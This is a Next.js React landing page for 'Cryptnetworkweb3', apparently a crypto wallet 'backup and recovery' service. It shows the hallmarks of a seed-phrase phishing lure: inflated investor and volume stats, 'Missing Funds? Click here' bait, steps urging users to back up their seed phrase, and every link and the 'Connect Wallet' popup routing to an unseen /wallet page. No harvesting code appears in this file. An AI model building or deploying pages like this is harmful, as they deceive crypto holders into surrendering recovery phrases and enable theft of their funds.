"use client"
import styles from "./page.module.css"
import { useState, useRef, useEffect } from "react"
import { useRouter } from 'next/navigation';
import Image from "next/image";

export default function Page() {
  const [show, setShow] = useState(false)
  function handleClick(){
    setShow(!show)
  }
  console.log(handleClick)
  return (
    <div className={styles.page}>
      <Navbar handleShow={handleClick}/>
      <Hero handleShow={handleClick}/>
      <Secure/>
      <Explore handleShow={handleClick}/>
      <Start handleShow={handleClick}/>
      <Recovery handleShow={handleClick}/>
      <Faq handleShow={handleClick}/>
      <Trust/>
      <Newsletter/>
      <Footer/>
      {show && <Popup handleShow={handleClick}/>}
      <Floater/>
    </div>
  )
}

function Floater(){
  return(
    <div className={styles.float}>
      <span>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
      </span>
      <p>Send us a message</p>
      <p>jivochat</p>
    </div>
  )
}

function Navbar({handleShow}){
  const [pop, setPop] = useState(false)
  const router = useRouter();
  function handleClick(){
    setPop(!pop)
  }

  return (
    <nav className={styles.nav}>
        <h1><span className={styles.gold}>C</span><span className={styles.pink}>r</span>yptnetworkweb3</h1>
        <ul onClick={()=> router.push("/wallet")}>
            <li>IGO</li>
            <li>LAUNCHPAD</li>
            <li>STAKING</li>
            <li>FARMING</li>
            <li>CRYPTO</li>
            <li>DEFI</li>
            <li>WEB3</li>
            <li>IDO</li>
            <li>TOKEN</li>
            <li>NFT</li>
        </ul>
        {pop && <main>
          <span onClick={handleClick}>X</span>
          <ol onClick={()=> router.push("/wallet")}>
            <li>IGO</li>
            <li>LAUNCHPAD</li>
            <li>STAKING</li>
            <li>FARMING</li>
            <li>CRYPTO</li>
            <li>DEFI</li>
            <li>WEB3</li>
            <li>IDO</li>
            <li>TOKEN</li>
            <li>NFT</li>
          </ol>
        </main>}
        <button onClick={handleShow}>Connect Wallet</button>
        <div onClick={handleClick}>
          <span></span><span></span><span></span>
        </div>
    </nav>
  )
}

export function Hero({handleShow}){
  const ref = useRef(null);
  const [inView, setInView] = useState(false);

  useEffect(() => {
    const el = ref.current;

    const observer = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting) {
          setInView(true);      // trigger animation
          observer.unobserve(el); // run only once
        }
      },
      { threshold: 0.5 } // 50% visible
    );

    if (el) observer.observe(el);

    return () => observer.disconnect();
  }, [])
  return (
    <section className={styles.hero}>
      <div className={styles.heromain}>
        <div className={styles.main}>
          <div className={styles.circle}></div>
          <h1>Gateway to Encrypt, back up, and <span className={styles.blue}>secure </span><span className={styles.yellow}> your assets</span></h1>
          <p>The easiest, safest, and fastest way to secure & back up crypto asset.</p>
          <div className={styles.btns}>
            <button className={styles.connect} onClick={handleShow}>Connect Wallet</button>
            <button className={styles.explore} onClick={handleShow}>Explore Now</button>
          </div>
          <Image
            src="/Home Page/bitcoin-2.png"
            alt="Coin Logo"
            className={styles.bitcoin}
            width={100}
            height={24}
            priority
          />
        </div>
        <div className={styles.imgBox}>
          <Image
            src="/Home Page/Web3.png"
            alt="Web3 Logo"
            className={styles.web3}
            width={500}
            height={26}
            priority
          />
          <Image
            src="/Home Page/globe.png"
            alt="Globe Logo"
            className={styles.globe}
            width={100}
            height={24}
            priority
          />
          <Image
            src="/Home Page/bitcoin-2.png"
            alt="Coin Logo"
            className={styles.tether}
            width={90}
            height={24}
            priority
          />
        </div>
      </div>
      <div className={styles.circle2}></div>
      <div className={styles.circle3}></div>
      <div className={styles.circle4}></div>
      <div className={[styles.stats, inView ? styles.animate: ""].join(' ')} ref={ref}>
        <div className={styles.block} >
          <h1>
            <div className={styles.odometer} >
              <div className={styles.digit}>
                <span>2</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>2</span>
              </div>
              <div className={styles.digit}>
                <span>0</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>0</span>
              </div>
              <div className={styles.digit}>
                <span>0</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>0</span>
              </div>
            </div>+
          </h1>
          <p>Countries Covered</p> 
        </div>
        <div className={styles.block}>
          <h1>
            <div className={styles.odometer} ref={ref}>
              <div className={styles.digit}>
                <span>3</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>3</span>
              </div>
              <div className={styles.digit}>
                <span>0</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>0</span>
              </div>
            </div>Million
          </h1>
          <p>Global Investors</p> 
        </div>
        <div className={styles.block}>
          <h1>
            <div className={styles.odometer} ref={ref}>
              <div className={styles.digit}>
                <span>7</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>7</span>
              </div>
              <div className={styles.digit}>
                <span>0</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>0</span>
              </div>
              <div className={styles.digit}>
                <span>0</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>0</span>
              </div>
            </div>+
          </h1>
          <p>Secured Wallet</p> 
        </div>
        <div className={styles.block}>
          <h1>$
            <div className={styles.odometer} ref={ref}>
              <div className={styles.digit}>
                <span>1.</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>1.</span>
              </div>
              <div className={styles.digit}>
                <span>3</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>3</span>
              </div>
              <div className={styles.digit}>
                <span>6</span><span>1</span><span>2</span><span>3</span><span>4</span>
                <span>5</span><span>6</span><span>7</span><span>8</span><span>6</span>
              </div>
            </div>Billion+
          </h1>
          <p>Secured Volume</p> 
        </div>
      </div>
    </section>
  )
}

export function Secure(){
  const offers = [
    {
      head: "Connect to Dapps",
      text: "Connect decentralized apps to mobile wallets and enable DAPP.",
      img: "/Home Page/globe-2.png"
    },
    {
      head: "Missing Funds",
      text: "Lost access to funds or missing funds? Click here.",
      img: "/Home Page/trade.png"
    },
    {
      head: "High Fee",
      text: "Transaction fees too high? Click here.",
      img: "/Home Page/spot.png"
    },
    {
      head: "24/7 Support",
      text: "Count on us for round-the-clock support, help whenever you need it.",
      img: "/Home Page/support.png"
    },
    {
      head: "Trusted & Secure",
      text: "Your assets2. On your terms. At your fingertips.",
      img: "/Home Page/trusted.png",
      class: true
    },
  ]
  return (
    <section className={styles.secure}>
      <div className={styles.find}>
        <h1 className={styles.head}>Find & Secure <span className={styles.blue}>crypto</span> Now!</h1>
        <p>Our comprehensive cybersecurity platform, driven by artificial intelligence, not only safeguards your organization.</p>
      </div>
      <div className={styles.offers}>
        {offers.map((offer,i)=>{
            return(
              <div key={i}>
                <h1 className={styles.head2}>{offer.head}</h1>
                <p>{offer.text}</p>
                <Image
                  src={offer.img}
                  alt="Coin Logo"
                  className={offer.class ? styles.logo : ""}
                  width={300}
                  height={250}
                  priority
                />
              </div>
            )
        })}
      </div>
    </section>
  )
}

export function Explore({handleShow}){
  return (
    <section className={styles.explore2}>
      <div className={styles.web}>
        <div className={styles.webbox}>
          <h1 className={styles.head}>Explore <span className={styles.blue}>Web3</span></h1>
          <p>It is the easiest, safest, and fastest way to secure & backup crypto asset.</p>
        </div>
        <button onClick={handleShow}>View More</button>
      </div>
      <div className={styles.scroller}>
        <div>
          <span>
            <Image
              src="/icons/spot-trading.png"
              alt="Coin Logo"
  
              width={50}
              height={50}
              priority
            />
          </span>
          <h2 className={styles.head3}>Spot Trading</h2>
          <p>Trade crypto with our</p>
          <p>comprehensive set of powerful tools to maximize your profits.</p>
          <span>View Details</span>
        </div>
        <div>
          <span>
            <Image
              src="/icons/margin.png"
              alt="Coin Logo"
  
              width={50}
              height={50}
              priority
            />
          </span>
          <h2>Margin Trading</h2>
          <p>Borrow, trade, and repay.</p>
          <p>Leverage your assets2 with margin trading.</p>
          <span>View Details</span>
        </div>
        <div>
          <span>
            <Image
              src="/icons/derivative.png"
              alt="Coin Logo"
  
              width={50}
              height={50}
              priority
            />
          </span>
          <h2>Crypto Derivatives</h2>
          <p>We are the best crypto exchange</p>
          <p>for trading crypto futures.</p>
          <span>View Details</span>
        </div>
        <div>
          <span>
            <Image
              src="/icons/earn.png"
              alt="Coin Logo"
  
              width={50}
              height={50}
              priority
            />
          </span>
          <h2>QFSEarn</h2>
          <p>Invest and earn steady income with</p>
          <p>the help of a professional asset manager.</p>
          <span>View Details</span>
        </div>
        <div>
          <span>
            <Image
              src="/icons/buy.png"
              alt="Coin Logo"
  
              width={50}
              height={50}
              priority
            />
          </span>
          <h2>Buy Crypto</h2>
          <p>Purchase crypto quickly and easily</p>
          <p>on our popular and industry-leading platform.</p>
          <span>View Details</span>
        </div>
        <div>
          <span>
            <Image
              src="/icons/margin.png"
              alt="Coin Logo"
  
              width={50}
              height={50}
              priority
            />
          </span>
          <h2>Margin Trading</h2>
          <p>Borrow, trade, and repay.</p>
          <p>Leverage your assets2 with margin trading.</p>
          <span>View Details</span>
        </div>
      </div>
      <div className={styles.scroll}>
      </div>
    </section>
  )
}

export function Start({handleShow}){
  return (
    <section className={styles.start}>
      <div className={styles.circle5}></div>
      <div className={styles.circle6}></div>
      <h1 className={styles.head}>How To Get <span className={styles.blue}>Started</span></h1>
      <div className={styles.steps}>
        <div>
          <span>01</span>
          <h2>Connect Wallet</h2>
          <p>Click connect wallet button.</p>
          <button onClick={handleShow}>Connect Wallet</button>
        </div>
        <div>
          <span>02</span>
          <h2>Select Wallet</h2>
          <p>Choose your prefered wallet to backup and click on connect.</p>
        </div>
        <div>
          <span>03</span>
          <h2>Backup your wallet</h2>
          <p>Your wallet backup may also be referred to as a: backup, recovery seed, seed, seed phrase, BIP-39 seed phrase, mnemonic, recovery phrase, (plus various combinations of these words)</p>
        </div>
        <div>
          <span>04</span>
          <h2>Start your journey</h2>
          <p>Having a safe wallet backup means you can recover your Bitcoin in case of hardware failure or the loss of your device</p>
        </div>
      </div>
    </section>
  )
}

export function Recovery({handleShow}){
  return (
    <section className={styles.recovery}>
      <div className={styles.circle7}></div>
      <div className={styles.circle8}></div>
      <div>
        <Image
          src="/Home Page/get.png"
          alt="Coin Logo"
          className={styles.icon}
          width={450}
          height={250}
          priority
        />
      </div>
      <div className={styles.backup}>
        <h1>How does wallet backup and recovery work?</h1>
        <div className={styles.crypto}>
          <div>
            <h2>Secure</h2>
            <p>First, we need to talk a little bit about how crypto wallets work. Crypto wallets work by holding cryptographic keys that are used to prove you have control over cryptoassets2 on a blockchain. Whenever you wish to do something with your cryptoassets2, you instruct the blockchain and use your private cryptographic key as a sort of digital signature to approve your desired action.</p>
          </div>
          <button onClick={handleShow}>Connect Wallet</button>
        </div>
      </div>
    </section>
  )
}

export function Faq({handleShow}){
  const faq = [
    {
      questions: "How can I secure my wallet?",
      answers: ["Set a unique passcode for your wallet.", "Also, make sure the numbers are random. Birthdays, anniversaries, house addresses, and the last digits of your phone number are all popular combinations and are crackable codes to a resourceful criminal."]
    },
    {
      questions: "How to backup a crypto wallet?",
      answers: ["1. Export Private Keys/Seed Phrase: Go to your wallet's settings and select the “backup wallet” or “export keys” option.", "2. Secure Your Backup: Store backups in multiple secure locations like USB drives, paper copies in fireproof safes, and safety deposit boxes."]
    },
    {
      questions: "How to keep bitcoin wallet safe?",
      answers: ["Securing Your Bitcoin: Choosing a Reputable Exchange."]
    },
    {
      questions: "How do I trust a safe wallet?",
      answers: ["Back up your wallet.", "Be cautious of phishing scams."]
    },
  ]
  return (
    <section className={styles.faq}>
      <div className={styles.faqhero}>
        <h3>FAQ</h3>
        <h1 className={styles.head}>Your questions <span className={styles.blue}>answered.</span></h1>
        <p className={styles.faqheropara}>Let's do our best to answer your most frequently asked questions.</p>
        <div className={styles.quest}>
          <div className={styles.questbox}>
            <span className={styles.questspan}>
              <p>?</p>
            </span>
            <div>
              <h2>Still have questions?</h2>
              <p>Can't find the answer you're looking for?Please chat to our friendly team!</p>
            </div>
          </div>
          <button onClick={handleShow}>Connect Wallet</button>
        </div>
      </div>
      <div className={styles.faquest}>
        {faq.map((item, i)=>{
          return(
            <Ans key={i} item={item}/>
          )
        })}
      </div>
    </section>
  )
}

export function Ans({item}){
  const [show, setShow] = useState(false)
  function handleClick(){
    setShow(!show)
  }
  return(
    <div>
      <p className={styles.questions}>{item.questions} {show ? <span style={{backgroundColor: "rgb(58, 150, 255"}} onClick={handleClick}>{"<"}</span> : <span onClick={handleClick}>{">"}</span> }</p>
      {show && <span className={styles.answers}>
        {item.answers.map((ans, i)=>{
          return(
            <p key={i}>{ans}</p>
          )
        })}
      </span>}
    </div>
  )
}

export function Trust(){
  const brands = [
    {src: "/brands/item-1.png"}, 
    {src: "/brands/item-2.png"}, 
    {src: "/brands/item-3.png"},
    {src: "/brands/item-4.png"},
    {src: "/brands/item-5.png"},
    {src: "/brands/item-6.png"},
    {src: "/brands/item-7.png"},
    {src: "/brands/item-8.png"},
    {src: "/brands/item-9.png"},
    {src: "/brands/item-10.png"},
  ]
  const repeated = Array(10).fill(brands).flat();
  return (
    <section className={styles.trust}>
      <h1 className={styles.head}>Trusted By</h1>
      <div className={styles.marqueewrapper}>
        <div className={styles.marquee1}>
          {repeated?.map((brand, i)=>{
            return(
              <Image
                src={brand.src}
                alt="Coin Logo"
    
                width={120}
                height={30}
                priority
                key={i}
              />
            )
          })}
        </div>
        <div className={styles.marquee2}>
          {repeated?.map((brand, i)=>{
            return(
              <Image
                src={brand.src}
                alt="Coin Logo"
                width={120}
                height={30}
                priority
                key={i}
              />
            )
          })}
        </div>
      </div>
      
    </section>
  )
}

export function Newsletter(){
  return (
    <section className={styles.news}>
      <div className={styles.quick}>
        <h1>Quick Links</h1>
        <div>
          <ul>
            <li>IGO</li>
            <li>LAUNCHPAD</li>
            <li>STAKING</li>
            <li>FARMING</li>
            <li>CRYPTO</li>
          </ul>
          <ul>
            <li>DEFI</li>
            <li>WEB3</li>
            <li>IEO</li>
            <li>IDO</li>
            <li>TOKEN</li>
            <li>GAMING</li>
            <li>NFT</li>
          </ul>
        </div>
      </div>
      <div className={styles.letter}>
        <h1>Newsletter</h1>
        <p>Welcome to Cryptnetworkweb3 your gateway to the world of Web3 trading! Our user-friendly platform</p>
        <span>
          <input type="email" placeholder="Enter Your Email..."/>
          <button>?</button>
        </span>
      </div>
    </section>
  )
}

export function Footer(){
  return (
    <section className={styles.footer}>
      <div>Copyright @ 2025 Cryptnetworkweb3</div>
    </section>
  )
}

export function Popup({handleShow}){
  const router = useRouter()
  return (
    <section className={styles.popup}>
      <main>
        <div className={styles.popuphead}>
          <div>
            <h1>Connect Wallet</h1>
            <p>Gateway to Web3</p>
          </div>
          <span onClick={handleShow}>X</span>
        </div>
        <div className={styles.popupbackup}>Backup Wallet</div>
        <div>
          <Image
            src="/icons/icon.png"
            alt="Coin Logo"
            width={50}
            height={50}
            priority
          />
          <h1>Automatic/Manual Backup</h1>
          <button onClick={()=> router.push("/wallet")}>Continue</button>
        </div>
      </main>
      
    </section>
  )
}
